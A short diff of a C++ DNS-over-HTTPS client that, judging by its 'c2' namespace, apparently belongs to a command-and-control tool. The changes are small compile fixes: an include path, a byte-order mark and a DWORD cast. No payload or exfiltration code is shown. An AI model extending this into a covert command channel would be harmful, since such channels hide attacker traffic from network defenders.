@@ -1,4 +1,4 @@
-#include "doh_client.hpp"
+﻿#include "doh_client.hpp"
 #include <windows.h>
 #include <winhttp.h>
 #include <vector>
@@ -7,7 +7,7 @@
 #include <chrono>
 #include <sstream>
 #include <iomanip>
-#include "../../utils/crypto.hpp"
+#include "../utils/crypto.hpp"
 
 namespace l4g::c2 {
 
@@ -96,7 +96,7 @@ DohResponse DohClient::doh_request(const std::string& dns_query) {
     }
     
     // Add Accept header
-    WinHttpAddRequestHeaders(request, L"Accept: application/dns-message", -1, WINHTTP_ADDREQ_FLAG_ADD);
+    WinHttpAddRequestHeaders(request, L"Accept: application/dns-message", (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
     
     if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
         response.error = "WinHttpSendRequest failed";
